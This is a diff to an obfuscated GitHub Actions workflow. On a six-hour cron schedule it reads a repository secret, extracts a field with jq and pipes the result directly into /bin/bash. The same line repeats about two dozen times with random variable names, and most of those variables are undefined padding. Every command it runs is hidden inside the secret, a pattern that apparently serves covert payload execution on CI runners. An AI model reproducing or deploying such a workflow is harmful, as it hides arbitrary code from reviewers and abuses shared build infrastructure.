@@ -2,7 +2,8 @@ name: boringsinglet
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 1/6 * * *'
+    - cron: '6 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +12,30 @@ jobs:
       - uses: actions/checkout@v4
       - name: boringsinglet
         env:
-          wplg0: ${{ secrets.wplg0 }}
+          vbt1: ${{ secrets.vbt1 }}
         run: |
-          echo $wplg0 | jq -r .dzhv25 | /bin/bash
-          echo $q2 | jq -r .nr304 | /bin/bash
-          echo $a81937 | jq -r .l8142 | /bin/bash
-          echo $s03542 | jq -r .kdfrl0 | /bin/bash
+          echo $vbt1 | jq -r .zji675 | /bin/bash
+          echo $f36075 | jq -r .w872 | /bin/bash
+          echo $q1928 | jq -r .tjnr3671 | /bin/bash
+          echo $bnhsa9889 | jq -r .sfn016 | /bin/bash
+          echo $otz08748 | jq -r .e8 | /bin/bash
+          echo $egq420 | jq -r .soy88562 | /bin/bash
+          echo $xelt202 | jq -r .pfgs987 | /bin/bash
+          echo $xtsnc31348 | jq -r .nfcht06721 | /bin/bash
+          echo $uzu9856 | jq -r .isx179 | /bin/bash
+          echo $zvlm03 | jq -r .wbfb92926 | /bin/bash
+          echo $m83 | jq -r .usp3926 | /bin/bash
+          echo $udp3471 | jq -r .ryqp98 | /bin/bash
+          echo $gyv1649 | jq -r .r3 | /bin/bash
+          echo $x1 | jq -r .fahd861 | /bin/bash
+          echo $a85275 | jq -r .mtfb6103 | /bin/bash
+          echo $tnq11369 | jq -r .qgc55 | /bin/bash
+          echo $wie4 | jq -r .g70691 | /bin/bash
+          echo $vhm42063 | jq -r .nq665 | /bin/bash
+          echo $sftwp49600 | jq -r .dc70893 | /bin/bash
+          echo $eqmne78632 | jq -r .px105 | /bin/bash
+          echo $xme365 | jq -r .gz7 | /bin/bash
+          echo $squpm28542 | jq -r .phhe1901 | /bin/bash
+          echo $qslsj13845 | jq -r .gk88 | /bin/bash
+          echo $mbswj7987 | jq -r .of08 | /bin/bash
 
